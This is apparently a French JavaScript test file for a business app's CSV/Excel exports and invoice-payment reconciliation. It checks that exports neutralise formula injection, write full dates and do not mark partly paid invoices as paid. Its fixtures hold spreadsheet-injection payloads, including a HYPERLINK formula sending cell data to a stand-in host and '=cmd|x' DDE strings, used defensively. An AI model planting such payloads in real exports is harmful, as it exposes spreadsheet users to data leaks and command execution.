/* ══ test-1120 · LES EXPORTS CSV / EXCEL ET LE VIREMENT POINTÉ (lot g07) ══════════════════════════════
   Trois défauts relevés par les testeurs au navigateur (16 octobre 2026) :
   · interventions#14 — l'export CSV des interventions n'échappait que les guillemets : un titre
     « =HYPERLINK(…) » ou un compte rendu « @SUM(…) » s'exécutait à l'ouverture dans Excel (injection de
     formule), et le montant s'écrivait « 33.5 » (lu comme du texte en locale française) ;
   · facturation#8 — l'Excel comptable, le registre et la télécollecte écrivaient des dates SANS ANNÉE
     (« 31 déc. », « 02 janv. » : deux années indiscernables), et un client « =1+1 Resto » partait en formule ;
   · facturation#3 — « Pointer un virement » marquait la facture entièrement PAYÉE quelle que soit la somme
     reçue (10 € sur 120 € TTC : plus rien ne signalait les 110 € manquants).

   Ce banc EXÉCUTE les vraies fonctions extraites d'app.html (les exports, regAdd, docTot, comptaVirementOk)
   dans un bac à sable qui capte le Blob téléchargé, et relit LA SORTIE : il ne cherche pas de motif dans le
   texte du fichier. fmtShort (écran) reste inchangé : « 31 déc. » reste ce que l'écran montre.          */
const fs = require('fs'), path = require('path'), vm = require('vm');
const BRUT = fs.readFileSync(path.join(__dirname, '..', 'app.html'), 'utf8');
const SRC = BRUT.replace(/^[ \t]*\/\*[\s\S]*?\*\//gm, ' ').replace(/^[ \t]*\/\/.*$/gm, ' ');
let ok = 0, ko = 0;
const vrai = (t, c, d) => { if (c) { ok++; console.log('  ✓ ' + t); } else { ko++; console.log('  ✗ ' + t + (d !== undefined ? '  → ' + JSON.stringify(d).slice(0, 400) : '')); } };
const v = (t, a, b) => vrai(t, JSON.stringify(a) === JSON.stringify(b), a);
function bloc(debut) {
  const i = SRC.indexOf(debut); if (i < 0) return '';
  let j = SRC.indexOf('{', i), p = 0;
  for (let k = j; k < SRC.length; k++) { const c = SRC[k]; if (c === '{') p++; else if (c === '}') { p--; if (p === 0) return SRC.slice(i, k + 1); } }
  return '';
}
const ligne = debut => { const i = SRC.indexOf(debut); return i < 0 ? '' : SRC.slice(i, SRC.indexOf('\n', i)); };

console.log('\n── 1120 · 0. la population ──');
const NOMS = ['csvCellule', 'csvCellMontant', 'csvLignes', 'csvDate', 'csvEsc', 'csvDownload', 'exportInterventionsCsv', 'exportClientsCsv',
  'downloadCSV', 'exportComptaCSV', 'exportComptaTout', 'exportRegistreCSV', 'exportTelecollecteCSV', 'exportBonCSV', 'comptaVirementOk',
  'regAdd', 'regQui', 'regTotal', 'docTot'];
const CODE = {}; NOMS.forEach(n => { CODE[n] = bloc('function ' + n + '('); });
v('les fonctions des exports et du virement sont trouvées', ['csvDownload', 'exportInterventionsCsv', 'exportClientsCsv', 'downloadCSV', 'exportComptaCSV',
  'exportComptaTout', 'exportRegistreCSV', 'exportTelecollecteCSV', 'exportBonCSV', 'comptaVirementOk', 'regAdd', 'docTot'].map(n => CODE[n].length > 40), Array(12).fill(true));
v('⛔ UNE seule fabrique de cellule : chaque fonction ne se déclare qu\'une fois (une seconde gagnerait partout)',
  NOMS.filter(n => CODE[n]).map(n => SRC.split('function ' + n + '(').length - 1).every(x => x === 1), true);
/* Un export n'a pas sa propre copie d'échappement : les guillemets ne se doublent qu'à UN endroit. */
const COPIES = (SRC.match(/replace\(\/"\/g,'""'\)/g) || []).length;
v('le doublement des guillemets n\'existe qu\'à un endroit (csvCellule), plus de copie en ligne', COPIES, 1);

/* ── Le bac à sable ── */
const TELE = [
  ['cb', 'CB (€)', '€'], ['esp', 'ESP (€)', '€'], ['nbChq', 'Nombre de CHQ', '#'], ['chq', 'CHQ (€)', '€'], ['vmt', 'VMT (€)', '€'], ['smupLdp', 'SMUP/LDP (€)', '€'], ['troisQuatre', '3x/4x (€)', '€']];
function monde(db, opts) {
  opts = opts || {};
  const ctx = { console, JSON, Math, Date, Set, Map, Object, Array, String, Number, RegExp, Intl, db, currentUser: { id: 'uA', prenom: 'Justin', nom: 'Roux' },
    __blobs: [], __toasts: [], __confirms: [], __saves: 0, __logs: [], __droit: opts.droit !== false, __confirmRep: opts.confirm !== false };
  vm.createContext(ctx);
  vm.runInContext(`
    class Blob { constructor(p){ this.texte=p.join(''); } }
    var URL={ createObjectURL(b){ __blobs.push(b.texte); return 'blob:x'; }, revokeObjectURL(){} };
    var document={ createElement(){ return { click(){}, remove(){} }; }, body:{ appendChild(){} } };
    function setTimeout(f){ }
    function toast(m){ __toasts.push(String(m)); }
    function confirm(m){ __confirms.push(String(m)); return __confirmRep; }
    function save(){ __saves++; } function closeModal(){} function logEvent(a,b){ __logs.push(a+'|'+b); }
    var views={ comptabilite(){}, factures(){} };
    function can(c){ return __droit; }
    function isFinanceMgr(){ return !!currentUser && can('voirCompta'); }
    var uid=(function(){ var n=0; return function(){ return 'id'+(++n); }; })();
    var todayISO=function(){ return '2026-10-16'; };
    function fmtShort(iso){ if(!iso) return '—'; return new Date(iso+'T00:00:00').toLocaleDateString('fr-FR',{day:'2-digit',month:'short'}); }
    function eur(n){ return (Number(n)||0).toFixed(2).replace('.',',')+' €'; }
    function clientName(id){ var c=(db.clients||[]).find(function(x){ return x.id===id; }); return c?c.nom:'—'; }
    function techNames(i){ return i.tech||''; } function techName(){ return '—'; }
    function visibleInts(l){ return l; } function visibleClients(l){ return l; }
    function fullName(u){ return u?((u.prenom||'')+' '+(u.nom||'')).trim():'—'; }
    function rapportSociete(){ return 'Société A'; }
    function bonNum(b){ return b.num; }
    function teleWho(r){ return r.declarantNom||'—'; }
    function teleTotal(r){ return ['cb','esp','chq','vmt','smupLdp','troisQuatre'].reduce(function(s,k){ return s+(Number(r[k])||0); },0); }
    function bonLU(l){ return (parseInt(l.cartons)||0)*(l.upc||1)+(parseInt(l.quantite)||0); }
    var ligHT=function(ls){ return Number((ls||[]).reduce(function(s,l){ return s+(l.q||0)*(l.pu||0); },0).toFixed(2)); };
    var STATUT_INT={ terminee:{l:'Terminée'} };
    var FACT_ST={envoyee:{l:'Envoyée'},payee:{l:'Payée'}};
    var REG_MODES=${JSON.stringify({ VIR: ['🏦', 'Virement'], CB: ['💳', 'Carte bancaire'] })};
    var REG_SOURCES=${JSON.stringify({ compta: ['Comptabilité', '#1E7A4E'] })};
    var TELE_CHAMPS=${JSON.stringify(TELE)};
    function intTechIds(){ return []; }
    ${NOMS.filter(n => CODE[n]).map(n => CODE[n]).join('\n')}`, ctx);
  return ctx;
}
/* Relit un Blob : [en-têtes…, lignes…] en cellules, en retirant le BOM et les guillemets de chaque cellule. */
function cellules(texte) {
  const brut = texte.replace(/^﻿/, '');
  return brut.split(/\r?\n/).map(l => l === '' ? [] : l.split(/";"/).map((c, i, a) => { c = c.replace(/^"/, ''); if (i === a.length - 1) c = c.replace(/"$/, ''); return c.replace(/""/g, '"'); }));
}

console.log('\n── 1120 · 1. interventions#14 — l\'export des interventions ──');
{
  const db = { clients: [{ id: 'c1', nom: '=1+1 Resto' }],
    interventions: [{ id: 'i1', num: 'INT-1', date: '2026-10-03', heure: '09:00', titre: '=HYPERLINK("http://exemple.test/?"&A1;"clic")', type: 'Dératisation', clientId: 'c1', tech: 'Karim',
      statut: 'terminee', duree: 60, adresse: '1 rue X', montant: 33.5, nuisibles: ['rats'], compteRendu: '@SUM(1+1)*cmd|x' }] };
  const m = monde(db);
  m.exportInterventionsCsv();
  const L = cellules(m.__blobs[0] || '');
  vrai('un fichier est téléchargé', m.__blobs.length === 1, m.__blobs.length);
  vrai('le BOM UTF-8 est conservé', (m.__blobs[0] || '').charCodeAt(0) === 0xFEFF);
  const r = L[1] || [];
  v('titre « =HYPERLINK(…) » : préfixé d\'une apostrophe', (r[3] || '').slice(0, 12), "'=HYPERLINK(");
  v('compte rendu « @SUM(…) » : préfixé d\'une apostrophe', (r[12] || '').slice(0, 6), "'@SUM(");
  v('client « =1+1 Resto » : préfixé d\'une apostrophe', r[5], "'=1+1 Resto");
  v('montant 33.5 écrit à la française : 33,5', r[10], '33,5');
  v('le texte ordinaire reste tel quel', [r[0], r[4], r[9]], ['INT-1', 'Dératisation', '1 rue X']);
  vrai('aucune cellule ne COMMENCE par = + - @ (population : ' + r.length + ' cellules)', r.length === 13 && r.every(c => !/^[=+\-@]/.test(c) || /^[+-]?\d+(?:[.,]\d+)?$/.test(c)), r);
  const mc = monde(db); mc.exportClientsCsv();
  v('export des clients : le nom « =1+1 Resto » est neutralisé aussi', (cellules(mc.__blobs[0] || '')[1] || [])[0], "'=1+1 Resto");
}

console.log('\n── 2. csvCellule : neutraliser le TEXTE, jamais un nombre ──');
{
  const m = monde({});
  const C = m.csvCellule;
  vrai('csvCellule existe (la fabrique unique)', typeof C === 'function');
  if (typeof C === 'function') {
    v('= + - @ en tête d\'un texte → apostrophe', ['=A1', '+SUM(A1)', '-2+3', '@x'].map(C), ['"\'=A1"', '"\'+SUM(A1)"', '"\'-2+3"', '"\'@x"']);
    v('tabulation et retour chariot en tête → apostrophe', [C('\t=1'), C('\r=1')], ['"\'\t=1"', '"\'\r=1"']);
    v('un montant négatif formaté par num() reste un nombre', [C('-12,50'), C('+3'), C('-0,5')], ['"-12,50"', '"+3"', '"-0,5"']);
    v('un nombre JavaScript : virgule française, jamais d\'apostrophe', [C(-5), C(33.5), C(0)], ['"-5"', '"33,5"', '"0"']);
    v('null, undefined et chaîne vide → cellule vide', [C(null), C(undefined), C('')], ['""', '""', '""']);
    v('les guillemets se doublent', C('dit "oui"'), '"dit ""oui"""');
    v('une apostrophe au milieu ou un texte banal : intacts', [C('l\'été'), C('Dupont')], ['"l\'été"', '"Dupont"']);
  }
}

console.log('\n── 3. facturation#8 — l\'Excel comptable : dates complètes, formules neutralisées ──');
{
  const db = { clients: [{ id: 'c1', nom: 'Boulangerie Au Bon Pain' }, { id: 'c2', nom: '=1+1 Resto' }],
    factures: [{ id: 'f1', num: 'FAC-2025-012', date: '2025-12-31', clientId: 'c1', lignes: [{ q: 1, pu: 100 }], tva: 20, statut: 'payee' },
      { id: 'f2', num: 'FAC-2026-001', date: '2026-01-02', clientId: 'c2', lignes: [{ q: 1, pu: 50 }], tva: 20, statut: 'envoyee' }],
    telecollectes: [{ id: 't1', date: '2025-12-31', heure: '18:00', declarantNom: 'Karim Benali', cb: 40, esp: 10, nbChq: 1, chq: 20, envoyeeCompta: true }],
    registres: [{ id: 'r1', ts: 1, date: '2026-01-02', heure: '10:00', montant: 120, mode: 'VIR', source: 'compta', declarantNom: '=cmd|x', clientNom: '@SUM(1)', note: '' }] };
  const m = monde(db);
  m.exportComptaTout();
  const L = cellules(m.__blobs[0] || '');
  const tout = L.map(l => l.join('|')).join('\n');
  const f1 = L.find(l => l[0] === 'FAC-2025-012') || [], f2 = L.find(l => l[0] === 'FAC-2026-001') || [];
  v('facture du 31/12/2025 : date complète', f1[1], '31/12/2025');
  v('facture du 02/01/2026 : date complète (l\'année la distingue)', f2[1], '02/01/2026');
  v('client « =1+1 Resto » neutralisé', f2[2], "'=1+1 Resto");
  v('les montants gardent leur virgule', [f1[3], f1[5]], ['100,00', '120,00']);
  const tele = L.find(l => l[2] === 'Karim Benali') || [];
  v('télécollecte : date complète', tele[0], '31/12/2025');
  const reg = L.find(l => l[6] === '120,00') || [];
  v('registre : date complète, qui/client neutralisés', [reg[0], reg[2], reg[3]], ['02/01/2026', "'=cmd|x", "'@SUM(1)"]);
  vrai('plus aucune date sans année dans le fichier (« 31 déc. »)', !/\d{2} (déc|janv)\./.test(tout), tout.slice(0, 300));
  vrai('la ligne de titre porte la date complète du jour', /RÉCAP COMPTABLE OP GESTION — 16\/10\/2026/.test(tout), L[0]);

  const mr = monde(db); mr.exportRegistreCSV();
  const R = cellules(mr.__blobs[0] || '');
  v('registre exporté : date complète et neutralisation', [(R[1] || [])[0], (R[1] || [])[2], (R[1] || [])[3]], ['02/01/2026', "'=cmd|x", "'@SUM(1)"]);
  const mt = monde(db); mt.exportTelecollecteCSV();
  const T = cellules(mt.__blobs[0] || '');
  v('télécollecte exportée : date complète', (T[1] || [])[0], '31/12/2025');
  const mf = monde(db); mf.exportComptaCSV();
  const F = cellules(mf.__blobs[0] || '');
  const g1 = F.find(l => l[0] === 'FAC-2025-012') || [], g2 = F.find(l => l[0] === 'FAC-2026-001') || [];
  v('Excel des factures seules : dates complètes, montants à virgule, client neutralisé', [g1[1], g2[1], g1[5], g2[2]], ['31/12/2025', '02/01/2026', '120,00', "'=1+1 Resto"]);
  v('fmtShort reste ce que l\'écran montre (sans année)', /^31 déc/.test(m.fmtShort('2025-12-31')), true);

  const mb = monde({ bons: [{ id: 'b1', num: 'BC-1', lignes: [{ reference: 'R1', designation: '=cmd|x', cartons: 1, upc: 6, quantite: 0, commentaire: '' }] }] });
  mb.exportBonCSV('b1');
  v('bon de commande exporté : désignation neutralisée', (cellules(mb.__blobs[0] || '')[1] || [])[1], "'=cmd|x");
}

console.log('\n── 4. facturation#3 — « Pointer un virement » : le montant reçu atteint-il le TTC ? ──');
{
  const neuve = () => ({ clients: [{ id: 'c1', nom: 'Resto' }], registres: [],
    factures: [{ id: 'f1', num: 'FAC-1', date: '2026-10-01', clientId: 'c1', lignes: [{ q: 1, pu: 100 }], tva: 20, statut: 'envoyee' }] });
  const ev = (montant, fid) => ({ preventDefault() {}, target: { fid: fid || 'f1', montant: String(montant), date: '2026-10-15' } });
  function joue(m, montant) {
    vm.runInContext('function FormData(t){ return Object.entries(t); }', m);
    m.comptaVirementOk(ev(montant));
  }
  {
    const db = neuve(), m = monde(db, { confirm: false });
    joue(m, 10);
    vrai('10 € sur 120 € : un confirm explicite est posé (population : ' + m.__confirms.length + ')', m.__confirms.length === 1, m.__confirms);
    vrai('le confirm dit ce qu\'il reste (110)', /110/.test(m.__confirms[0] || ''), m.__confirms[0]);
    v('refus : rien n\'est écrit — ni registre, ni statut, ni date de paiement', [db.registres.length, db.factures[0].statut, db.factures[0].datePaiement || null], [0, 'envoyee', null]);
    v('refus : ni enregistrement ni journal', [m.__saves, m.__logs.length], [0, 0]);
  }
  {
    const db = neuve(), m = monde(db, { confirm: true });
    joue(m, 10);
    v('accord : l\'encaissement entre au registre, rattaché à la facture', db.registres.map(l => [l.montant, l.factureId, l.mode]), [[10, 'f1', 'VIR']]);
    v('accord : la facture N\'EST PAS marquée payée (il reste 110 €)', [db.factures[0].statut, db.factures[0].datePaiement || null], ['envoyee', null]);
    vrai('accord : le toast ne dit pas « payée »', !/payée/.test(m.__toasts.join('|')) && /110/.test(m.__toasts.join('|')), m.__toasts);
    /* Le solde arrive : le total reçu (10 + 110) atteint le TTC. */
    joue(m, 110);
    v('le solde reçu : plus de confirm (un seul au total) et la facture passe payée', [m.__confirms.length, db.factures[0].statut, db.registres.length], [1, 'payee', 2]);
    vrai('la date de paiement est posée', db.factures[0].datePaiement === '2026-10-15', db.factures[0].datePaiement);
  }
  {
    const db = neuve(), m = monde(db);
    joue(m, 120);
    v('le montant exact : aucun confirm, facture payée, une ligne', [m.__confirms.length, db.factures[0].statut, db.registres.length], [0, 'payee', 1]);
  }
  {
    const db = neuve(), m = monde(db);
    joue(m, 125);
    v('un excédent n\'est pas un reste dû : aucun confirm, facture payée', [m.__confirms.length, db.factures[0].statut], [0, 'payee']);
  }
  {
    const db = neuve(); db.registres.push({ id: 'r0', factureId: 'f1', montant: 50, mode: 'CB', date: '2026-10-10' });
    const m = monde(db);
    joue(m, 70);
    v('50 € déjà au registre sur cette facture + 70 € = 120 € : payée, sans confirm', [m.__confirms.length, db.factures[0].statut], [0, 'payee']);
  }
  {
    const db = neuve(), m = monde(db, { droit: false });
    joue(m, 120);
    v('sans le droit « Voir / gérer la comptabilité » : rien n\'est écrit', [db.registres.length, db.factures[0].statut, m.__saves], [0, 'envoyee', 0]);
  }
}

console.log('\n' + (ok + ko) + ' vérifications');
console.log('════ test-1120 : ' + ok + ' ✓  ' + ko + ' ✗ ════');
console.log(ok + ' ✓  ' + ko + ' ✗');
process.exit(ko ? 1 : 0);
